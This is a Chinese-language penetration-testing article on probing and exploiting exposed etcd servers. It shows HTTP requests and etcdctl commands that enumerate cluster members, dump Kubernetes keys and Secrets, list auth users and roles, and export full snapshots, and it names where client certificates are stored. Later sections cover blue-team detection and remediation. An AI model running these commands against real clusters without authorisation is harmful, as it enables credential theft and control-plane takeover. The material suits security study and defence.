---
title: "etcd管理面打点与API利用技术"
date: 2026-06-15T13:19:03+08:00
draft: false
weight: 61
description: "围绕etcd相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "配置存储", "etcd"]
---

# etcd管理面打点与API利用技术

`etcd` 是典型的高价值基础设施控制平面。它不是普通缓存或普通 KV 存储，而是大量分布式系统用于保存一致性状态、选举信息、配置、租约和核心元数据的后端。对攻击者来说，etcd 的价值不在某个单点接口，而在于一旦它被暴露，通常能够一次性拿到：

- 集群成员与 leader 拓扑
- 关键配置键值
- 认证与角色状态
- 快照与恢复链路
- 调试与监控接口
- Kubernetes 全量控制面对象

在 Kubernetes 场景下，etcd 的价值会进一步放大，因为它是控制面的实际后端。未授权访问 etcd 通常不仅意味着“能看几个键”，而是可能直接回收：

- `Secret`
- `ConfigMap`
- `ServiceAccount`
- `Pod`
- `Node`
- `RoleBinding`
- `Webhook` 配置
- API Server 依赖的集群状态

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 etcd
2. 如何区分 `v2 HTTP API` 与 `v3 gRPC/etcdctl` 访问面
3. 如何围绕成员、健康、键空间、认证、快照与调试接口建立攻击价值判断
4. 在 Kubernetes 场景下应优先关注哪些高价值键前缀
5. 蓝队如何从访问日志、etcd 日志、指标与 Kubernetes 审计中识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `2379/tcp`
- `2380/tcp`
- `/version`
- `/health`
- `/livez`
- `/readyz`
- `/metrics`
- `/debug/pprof/`
- `/debug/requests`
- `/v2/keys/`
- `/v2/stats/self`
- `/v2/stats/leader`
- `/v2/members`

如果目标是 v3 访问面，还应重点关注通过 `etcdctl` 或 gRPC 调用的：

- `endpoint health`
- `endpoint status`
- `endpoint hashkv`
- `member list`
- `snapshot save`
- `user list`
- `role list`
- `auth status`

### 0.2 协议与认证边界

etcd 常见访问方式包括：

- 旧版 `v2` 的 HTTP/JSON API
- `v3` 的 gRPC API
- `grpc-gateway` 场景下的 HTTP 转发
- `etcdctl`
- `etcdutl`

常见安全边界包括：

- 明文 HTTP
- HTTPS 但不校验客户端证书
- mTLS
- 用户名密码认证
- RBAC

官方文档明确指出，etcd 为了降低初始使用门槛，并不会默认开启 RBAC 认证；未启用安全特性的集群会把数据暴露给任意客户端。

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，etcd 的打点收益一般可排为：

1. 确认是否为 etcd、是否启用 TLS、健康与 leader 状态如何
2. 枚举成员与版本
3. 确认 `v2` 是否仍开放、`v3` 是否可通过 `etcdctl` 读取
4. 枚举关键键前缀、认证状态与 root 权限面
5. 判断是否存在快照导出、调试接口、metrics 与 Kubernetes 高价值前缀暴露

---

## 1. 第一轮打点：确认是否为 etcd

### 1.1 `/version`

最轻量的识别入口通常是 `/version`。

#### 请求示例

```http
GET /version HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "etcdserver": "3.5.12",
  "etcdcluster": "3.5.0"
}
```

这条响应可以直接回收：

- server 版本
- cluster 版本
- 目标是否大概率仍保留兼容旧接口

### 1.2 `/health`

很多环境会把 `/health` 暴露给负载均衡或监控。

#### 请求示例

```http
GET /health HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "health": "true",
  "reason": ""
}
```

### 1.3 `/livez` 与 `/readyz`

官方监控文档说明，自 `v3.4.29` 起新增：

- `/livez`
- `/readyz`

并支持 `?verbose` 与 `?exclude=` 参数。

#### 请求示例

```http
GET /readyz?verbose HTTP/1.1
Host: etcd.target.example:2379
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
[+]data_corruption ok
[+]serializable_read ok
[+]linearizable_read ok
ok
```

这类响应的价值在于：

- 能确认目标确实是较新的 etcd
- 能看到就绪检查项名称
- 能判断集群处于可服务状态

### 1.4 TLS 与客户端证书判断

如果访问 `https://host:2379/version` 出现：

- 普通证书错误：通常说明服务开启了 HTTPS
- 握手后返回 `client certificate required` 或直接拒绝：通常说明启用了 `--client-cert-auth`

这一步对后续判断非常关键，因为它会决定后续是：

- 继续探测 HTTP 明文接口
- 转向寻找泄露的客户端证书
- 转向寻找 API Server 或运维主机上的 `etcdctl` 参数

---

## 2. 第二轮打点：成员、Leader 与集群状态

### 2.1 v2 `stats/self`

在保留 `v2` 兼容面的环境中，`/v2/stats/self` 往往能直接暴露节点身份。

#### 请求示例

```http
GET /v2/stats/self HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "name": "infra0",
  "id": "8e9e05c52164694d",
  "state": "StateLeader",
  "startTime": "2026-06-15T06:41:11.428746Z",
  "leaderInfo": {
    "leader": "8e9e05c52164694d",
    "uptime": "7h3m29.012345678s"
  },
  "recvAppendRequestCnt": 0
}
```

这条接口可以直接回收：

- 节点名
- member ID
- 当前是否 leader
- leader uptime

### 2.2 v2 `stats/leader`

#### 请求示例

```http
GET /v2/stats/leader HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "leader": "8e9e05c52164694d",
  "followers": {
    "91bc3c398fb3c146": {
      "latency": {
        "current": 0.000652,
        "average": 0.000811
      }
    }
  }
}
```

这类响应对打点的意义在于：

- 直接暴露 follower ID
- 暴露 leader 到 follower 的延迟
- 便于判断是否存在不稳定或性能问题

### 2.3 v2 `members`

#### 请求示例

```http
GET /v2/members HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "members": [
    {
      "id": "8e9e05c52164694d",
      "name": "infra0",
      "peerURLs": [
        "http://10.20.30.31:2380"
      ],
      "clientURLs": [
        "http://10.20.30.31:2379"
      ]
    },
    {
      "id": "91bc3c398fb3c146",
      "name": "infra1",
      "peerURLs": [
        "http://10.20.30.32:2380"
      ],
      "clientURLs": [
        "http://10.20.30.32:2379"
      ]
    }
  ]
}
```

这类返回会直接暴露：

- 全部成员 IP
- peer URL
- client URL
- 命名规则

### 2.4 `etcdctl endpoint health`

在 v3 场景中，最快的探针往往是 `etcdctl endpoint health`。

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379,https://10.20.30.32:2379,https://10.20.30.33:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  endpoint health --cluster
```

#### 典型响应示例

```text
https://10.20.30.31:2379 is healthy: successfully committed proposal: took = 8.732ms
https://10.20.30.32:2379 is healthy: successfully committed proposal: took = 10.114ms
https://10.20.30.33:2379 is healthy: successfully committed proposal: took = 9.845ms
```

这类输出会直接给出：

- 哪些 endpoint 存活
- 是否还能提交 proposal
- 延迟大概在什么级别

### 2.5 `etcdctl endpoint status`

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379,https://10.20.30.32:2379,https://10.20.30.33:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  endpoint status --cluster -w table
```

#### 典型响应示例

```text
+-------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
|        ENDPOINT         |        ID        | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |
+-------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
| https://10.20.30.31:2379| 8e9e05c52164694d |  3.5.12 |   85 MB |      true |      false |        97 |    1459912 |            1459912 |        |
| https://10.20.30.32:2379| 91bc3c398fb3c146 |  3.5.12 |   85 MB |     false |      false |        97 |    1459912 |            1459912 |        |
+-------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
```

这类输出对打点非常关键，因为它会明确暴露：

- leader 节点
- learner 成员
- DB 大小
- raft index / applied index

### 2.6 `endpoint hashkv`

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379,https://10.20.30.32:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  endpoint hashkv --cluster
```

#### 典型响应示例

```text
https://10.20.30.31:2379, 1459912, 3882276094
https://10.20.30.32:2379, 1459912, 3882276094
```

这类输出虽然更偏运维，但对攻击者仍然有价值，因为它能帮助判断：

- 集群一致性是否正常
- 当前成员是否来自同一状态面

---

## 3. 第三轮打点：键空间与高价值前缀

### 3.1 v2 `keys` 枚举

旧环境仍可能保留 `v2` 的 `/v2/keys` 面。

#### 请求示例

```http
GET /v2/keys/?recursive=true HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "action": "get",
  "node": {
    "key": "/",
    "dir": true,
    "nodes": [
      {
        "key": "/registry",
        "dir": true
      },
      {
        "key": "/coreos.com",
        "dir": true
      }
    ]
  }
}
```

### 3.2 v3 `get --prefix`

在 v3 环境中，更常见的是通过 `etcdctl get` 枚举。

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  get / --prefix --keys-only
```

#### 典型响应示例

```text
/registry/apiregistration.k8s.io/apiservices/v1.
/registry/configmaps/kube-system/coredns
/registry/secrets/default/default-token-km9c7
/registry/serviceaccounts/kube-system/attachdetach-controller
/registry/pods/prod/payment-api-5c9b88c7fb-rj4tm
```

一旦能看到这些前缀，风险已经从“控制面可识别”升级为“控制面数据可枚举”。

### 3.3 Kubernetes 场景下的高价值前缀

在 Kubernetes 里，至少应优先关注：

- `/registry/secrets/`
- `/registry/configmaps/`
- `/registry/serviceaccounts/`
- `/registry/pods/`
- `/registry/nodes/`
- `/registry/roles/`
- `/registry/rolebindings/`
- `/registry/clusterroles/`
- `/registry/clusterrolebindings/`
- `/registry/validatingwebhookconfigurations/`
- `/registry/mutatingwebhookconfigurations/`

这些前缀能分别回收：

- Secret 正文
- 配置文件
- ServiceAccount token
- Pod 规范与环境变量
- 节点信息
- RBAC 绑定关系
- Admission webhook 配置

### 3.4 读取具体键

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  get /registry/secrets/prod/payment-api-db -w hex
```

#### 典型响应示例

```text
2f72656769737472792f736563726574732f70726f642f7061796d656e742d6170692d6462
6b38733a76310a0c0a02763112065365637265741a6c0a1364617461626173652d70617373776f72641255335352794d47655159584e7a4954457a49673d3d
```

这类值在很多场景下是 Protobuf 或 JSON 序列化后的 Kubernetes 对象，一旦被解码，通常可以继续回收：

- Secret `data`
- 注解
- owner reference
- namespace

### 3.5 失败响应也有价值

#### 典型失败响应示例

```text
Error: etcdserver: user name is empty
```

或：

```text
Error: etcdserver: permission denied
```

这些失败能帮助判断：

- etcd 已启用认证
- 当前凭据无效或权限不足
- 后续更应转向证书、API Server 参数或 root 用户面

---

## 4. 第四轮打点：认证、用户与 root 权限面

### 4.1 认证默认不是开启态

官方文档明确说明：

- `root` 用户必须在启用认证前先创建
- `root` 角色拥有全局读写与认证配置修改能力
- `root` 角色还具备集群维护能力，包括成员修改、defrag 和 snapshot

这意味着一旦获得 `root` 用户或具备 `root` 角色的证书身份，风险不只是“能读键”，而是对整个 etcd 控制面拥有接管能力。

### 4.2 `auth status`

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  auth status
```

#### 典型响应示例

```text
Authentication Status: true
AuthRevision: 17
```

### 4.3 `user list` 与 `role list`

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  user list
```

#### 典型响应示例

```text
root
kube-apiserver
backup-operator
```

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  role list
```

#### 典型响应示例

```text
root
readonly
k8s-control-plane
```

这类返回非常适合回收：

- 运维账号命名
- 控制面组件账号
- 备份与自动化账号

### 4.4 v2 `auth` 面

旧环境如果仍保留 v2 认证面，应重点关注：

- `GET /v2/auth/enable`
- `/v2/auth/users`
- `/v2/auth/roles`

#### 请求示例

```http
GET /v2/auth/enable HTTP/1.1
Host: etcd.target.example:2379
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "enabled": true
}
```

v2 文档还明确指出：

- `guest` 角色对应未认证请求
- 为了兼容历史行为，`guest` 默认可能拥有完整 keyspace 权限

这也是为什么旧版暴露的 etcd 风险往往极高。

---

## 5. 第五轮打点：快照、恢复与离线价值

### 5.1 `snapshot save`

快照是 etcd 最高价值的接口之一。官方恢复文档明确说明，可通过 `etcdctl snapshot save` 从在线成员获取关键空间快照。

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/tmp/ca.pem --cert=/tmp/client.pem --key=/tmp/client-key.pem \
  snapshot save snapshot.db
```

#### 典型响应示例

```text
Snapshot saved at snapshot.db
```

这类成功意味着：

- 当前凭据已具备极高权限
- 攻击者可以离线分析整个 etcd keyspace
- Kubernetes 场景下几乎等价于把控制面数据库整体导出

### 5.2 `snapshot status`

在较新版本里，官方与 Kubernetes 文档都建议使用 `etcdutl snapshot status` 而不是旧的 `etcdctl snapshot status`。

#### 请求示例

```bash
etcdutl snapshot status snapshot.db -w table
```

#### 典型响应示例

```text
+----------+----------+------------+------------+
|   HASH   | REVISION | TOTAL KEYS | TOTAL SIZE |
+----------+----------+------------+------------+
| 7ef846e  |   485261 |      11642 |      94 MB |
+----------+----------+------------+------------+
```

这类输出能帮助判断：

- 快照 revision
- key 总量
- 大概规模

### 5.3 从数据目录复制快照

恢复文档同时指出，直接复制 `member/snap/db` 也能形成恢复源，但可能丢失尚未落到快照中的 WAL 数据。对攻击者来说，这意味着：

- 即使拿不到在线 API，也可能从宿主机或控制面节点拿到离线数据库
- 后续可用 `etcdutl` 做状态校验与恢复

### 5.4 `snapshot restore`

#### 请求示例

```bash
etcdutl snapshot restore snapshot.db \
  --name m1 \
  --data-dir m1.etcd \
  --initial-cluster m1=http://10.20.30.31:2380,m2=http://10.20.30.32:2380,m3=http://10.20.30.33:2380 \
  --initial-cluster-token etcd-cluster-1 \
  --initial-advertise-peer-urls http://10.20.30.31:2380
```

#### 典型输出示例

```text
added member 8e9e05c52164694d [http://10.20.30.31:2380] to cluster 5c2a9f0bc3faef11
```

这一步虽然更偏恢复与重建，但它说明：

- 快照一旦落到攻击者手中，后续可以在离线环境重建完整数据视图
- 风险并不止于在线访问阶段

---

## 6. 第六轮打点：监控、调试与性能侧信号

### 6.1 `/metrics`

官方监控文档明确说明，每个 etcd 节点默认都会在客户端端口暴露 `/metrics`。

#### 请求示例

```http
GET /metrics HTTP/1.1
Host: etcd.target.example:2379
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
# HELP etcd_server_has_leader Whether or not a leader exists.
# TYPE etcd_server_has_leader gauge
etcd_server_has_leader 1
# HELP etcd_server_leader_changes_seen_total The number of leader changes seen.
# TYPE etcd_server_leader_changes_seen_total counter
etcd_server_leader_changes_seen_total 3
```

### 6.2 高价值指标

至少应重点关注：

- `etcd_server_has_leader`
- `etcd_server_leader_changes_seen_total`
- `etcd_server_proposals_failed_total`
- `etcd_disk_backend_commit_duration_seconds`
- `etcd_debugging_snapshot_save_total_duration_seconds`

这些指标可以帮助判断：

- leader 是否存在
- leader 是否频繁变更
- proposal 是否失败
- 后端提交是否过慢
- snapshot 是否异常缓慢

### 6.3 `/debug/pprof`

当 `--debug` 打开时，官方文档说明 etcd 会在客户端端口暴露 `/debug` 下的调试信息，包括 `/debug/pprof`。

#### 请求示例

```http
GET /debug/pprof/ HTTP/1.1
Host: etcd.target.example:2379
Accept: text/html
Connection: close
```

#### 典型响应示例

```html
<html>
<head><title>/debug/pprof/</title></head>
<body>
<a href="goroutine?debug=1">goroutine</a>
<a href="heap?debug=1">heap</a>
</body>
</html>
```

这类暴露的风险在于：

- 可读取 goroutine、heap、mutex 等运行时信息
- 适合用来做性能与内部路径侦察

### 6.4 `/debug/requests`

官方文档同时说明，`/debug/requests` 会展示 gRPC traces 与性能统计。

#### 请求示例

```http
GET /debug/requests HTTP/1.1
Host: etcd.target.example:2379
Accept: text/html
Connection: close
```

#### 典型响应示例

```text
When                    Elapsed (s)
2026/06/15 15:01:41.999317 0.000244 /etcdserverpb.KV/Range
... recv: key:"/registry/secrets/prod/payment-api-db"
... OK
```

这类信息的价值在于：

- 直接暴露近期 gRPC 方法
- 可能暴露被访问的 key
- 可能暴露客户端地址与 deadline

---

## 7. Kubernetes 场景下的真实攻击价值

### 7.1 为什么 etcd 在 Kubernetes 中异常高危

Kubernetes 文档明确指出 etcd 是集群所有数据的 backing store。对攻击者来说，这意味着 etcd 一旦被控制，收益通常高于单独控制某个工作负载或某个 Namespace。

### 7.2 最值得优先回收的对象

在 Kubernetes 环境里，最值得优先关注：

- `Secret`
- `ServiceAccount`
- `ConfigMap`
- `MutatingWebhookConfiguration`
- `ValidatingWebhookConfiguration`
- `ClusterRoleBinding`
- `Node`
- `Pod`

原因分别是：

- `Secret` 可直接带出凭据
- `ServiceAccount` 可衔接到 API 访问
- `Webhook` 可帮助识别 admission 链路
- `ClusterRoleBinding` 可帮助建立权限画像
- `Node` 与 `Pod` 可帮助建立运行环境画像

### 7.3 Secret 示例

#### 请求示例

```bash
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.20.30.31:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/kube-system/bootstrap-token-abcde
```

#### 典型响应示例

```text
/registry/secrets/kube-system/bootstrap-token-abcde
k8s:...
```

即使值还未解码，这条命令本身也已经说明：

- 当前凭据足以触碰控制面数据
- 后续可以进一步离线解析对象正文

### 7.4 认证材料的常见来源

现实中最常见的 etcd 访问材料来源包括：

- `/etc/kubernetes/pki/etcd/ca.crt`
- `/etc/kubernetes/pki/etcd/server.crt`
- `/etc/kubernetes/pki/etcd/peer.crt`
- `/etc/kubernetes/pki/etcd/healthcheck-client.crt`
- kube-apiserver 静态 Pod manifest 中的 `--etcd-*` 参数
- 备份脚本里的 `etcdctl` 命令行参数

因此在控制面主机打点时，拿到 etcd 证书链通常是一个高收益分支。

---

## 8. 高危错误部署场景

### 8.1 明文 `2379` 暴露

如果 etcd 直接以 HTTP 暴露在 `2379`，风险通常最高，因为：

- `/version`
- `/health`
- `/v2/*`
- `/metrics`

都可能直接被低门槛访问。

### 8.2 只启用 TLS，未启用认证

有些环境只启用了 HTTPS，但没有启用 RBAC 或客户端证书校验。这类环境看起来“加了 TLS”，但如果任意客户端都能握手成功，实质上仍然是公开数据面。

### 8.3 v2 兼容面仍开放

旧版 `v2` 面的风险往往高于很多人预期，因为：

- 枚举路径门槛低
- 直接使用 `curl` 即可探测
- 旧的 `guest` 行为可能导致未认证读取

### 8.4 `root` 角色泄露

官方认证文档明确说明，`root` 角色除了全局读写外，还具备：

- 修改认证配置
- 修改成员
- defrag
- snapshot

因此一旦拿到 `root`，风险就不再是“读到数据”，而是“控制存储后端本身”。

### 8.5 Debug 接口暴露

如果同时暴露：

- `/debug/pprof`
- `/debug/requests`

就说明目标除数据面外，还额外暴露了内部运行时与近期请求轨迹。

---

## 9. 蓝队检测与处置

### 9.1 反向代理与访问日志

应重点识别对以下路径的连续访问：

- `/version`
- `/health`
- `/livez`
- `/readyz`
- `/metrics`
- `/debug/pprof/`
- `/debug/requests`
- `/v2/keys/`
- `/v2/stats/self`
- `/v2/stats/leader`
- `/v2/members`

#### 日志示例

```text
10.10.10.21 - - [15/Jun/2026:16:11:11 +0800] "GET /version HTTP/1.1" 200 52 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [15/Jun/2026:16:11:15 +0800] "GET /v2/members HTTP/1.1" 200 421 "-" "python-requests/2.32.3"
```

```text
10.10.10.21 - - [15/Jun/2026:16:11:17 +0800] "GET /debug/requests HTTP/1.1" 200 1322 "-" "Mozilla/5.0"
```

第三类日志通常说明访问者已经不再只是做健康探测，而是在主动回收内部请求轨迹。

### 9.2 etcd 进程日志

Datadog 与官方运维资料都强调 etcd 日志对性能与故障调查的重要性。应重点关注：

- `apply request took too long`
- `mvcc: database space exceeded`
- `rejected connection`
- TLS 握手失败
- 认证失败

#### 日志示例

```text
{"level":"warn","ts":"2026-06-15T08:11:21.449Z","caller":"etcdserver/util.go:170","msg":"apply request took too long","took":"142.331ms","expected-duration":"100ms","prefix":"read-only range ","request":"key:\"/registry/secrets/prod/payment-api-db\" "}
```

#### 日志示例

```text
{"level":"warn","ts":"2026-06-15T08:11:32.112Z","caller":"embed/config_logging.go:169","msg":"rejected connection","remote-addr":"10.10.10.21:54822","server-name":"","ip-addresses":["10.20.30.31"],"dns-names":[],"error":"tls: client didn't provide a certificate"}
```

这类日志非常适合识别：

- 针对 keyspace 的高频读取
- 客户端证书探测
- 性能退化与异常访问的叠加

### 9.3 `/debug/requests` 与 metrics 联动

如果 `--debug` 被启用，蓝队应把：

- `/debug/requests`
- `/metrics`

作为单独高风险面管理，因为前者会暴露请求轨迹，后者会暴露 leader、proposal、磁盘提交与 snapshot 相关指标。

### 9.4 Kubernetes 审计与控制面日志

如果 etcd 被用于 Kubernetes，应同步检查：

- kube-apiserver 与控制面节点日志
- `Secret`、`ServiceAccount`、`Node`、`Webhook` 相关 Kubernetes 审计事件
- 控制面主机上的 `etcdctl` 命令执行痕迹

因为实际攻击链经常不是“先有 etcd 再到 Kubernetes”，而是：

- 先落到控制面主机
- 再借本机证书访问 etcd

### 9.5 处置建议

发现 etcd 管理面被打点后，应优先做：

1. 收敛 `2379` 与 `2380` 暴露范围，不向低信任网络开放
2. 检查是否启用了 `client-cert-auth` 与认证 RBAC
3. 清理或关闭历史 `v2` 兼容面
4. 检查是否有 `root` 用户或客户端证书泄露
5. 检查是否已发生 `snapshot save`、批量 key 枚举或异常 `etcdctl` 使用
6. 对 Kubernetes 场景立即轮换高风险 `Secret`、证书与 ServiceAccount 材料

长期建议：

- 默认使用 mTLS 和认证
- 不暴露 debug 接口到非受控网络
- 对 `/version`、`/health`、`/v2/*`、`/metrics`、`/debug/*` 建立专门告警
- 定期校验快照备份链路并把快照作为高敏感数据管理
- 对控制面主机上的 etcd 证书和备份脚本执行最小权限治理

---

## 10. 复盘清单

### 10.1 红队侧

- 是否确认了目标是明文、HTTPS 还是 mTLS
- 是否确认了 `v2` 面是否仍开放
- 是否完成了 `members`、`leader`、`endpoint status` 的集群画像
- 是否验证了关键键前缀与 Kubernetes 高价值对象
- 是否判断了 `auth`、`root`、`snapshot` 与 `debug` 的真实边界

### 10.2 蓝队侧

- 是否能识别从 `version -> health -> members -> keys/snapshot` 的连续访问链
- 是否能识别对 `/debug/requests` 与 `/metrics` 的异常读取
- 是否能从 etcd 日志中提取 TLS 探测、认证失败与高频 Range 请求
- 是否知道控制面主机上哪些文件能直接访问 etcd

### 10.3 应急侧

- 是否确认是否有 keyspace 或 snapshot 已被导出
- 是否确认是否已有 Kubernetes Secret、Webhook、RBAC 数据被读取
- 是否完成 etcd 客户端证书、控制面凭据与高风险 Secret 轮换
- 是否完成 `v2` 面、debug 面与公网暴露面收敛

---

## 11. 总结

`etcd` 的真正风险，不只是“一个 KV 服务可访问”，而在于它经常承载：

- 集群成员关系
- 一致性状态
- 配置与凭据
- 认证与角色
- 快照与恢复
- Kubernetes 控制面全部对象

对打点来说，更值得沉淀的方法学是：

- 先确认版本、协议与健康检查面
- 再确认 leader、members 与 endpoint 状态
- 再枚举 keyspace 与 Kubernetes 高价值前缀
- 最后判断认证、快照、metrics 与 debug 是否打开

只有把这些面串起来，才能把“etcd 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [etcd API reference v3](https://etcd.io/docs/v3.4/dev-guide/api_reference_v3/)
- [Role-based access control](https://etcd.io/docs/v3.4/op-guide/authentication/)
- [Transport security model](https://etcd.io/docs/v3.5/op-guide/security/)
- [Monitoring etcd](https://etcd.io/docs/v3.4/op-guide/monitoring/)
- [Metrics](https://etcd.io/docs/v3.4/metrics/)
- [Disaster recovery](https://etcd.io/docs/v3.5/op-guide/recovery/)
- [etcdctl](https://github.com/etcd-io/etcd/blob/main/etcdctl/README.md)
- [etcdutl](https://github.com/etcd-io/etcd/blob/main/etcdutl/README.md)
- [Operating etcd clusters for Kubernetes](https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/)
- [v2 Auth and Security](https://etcd.io/docs/v2.3/auth_api/)
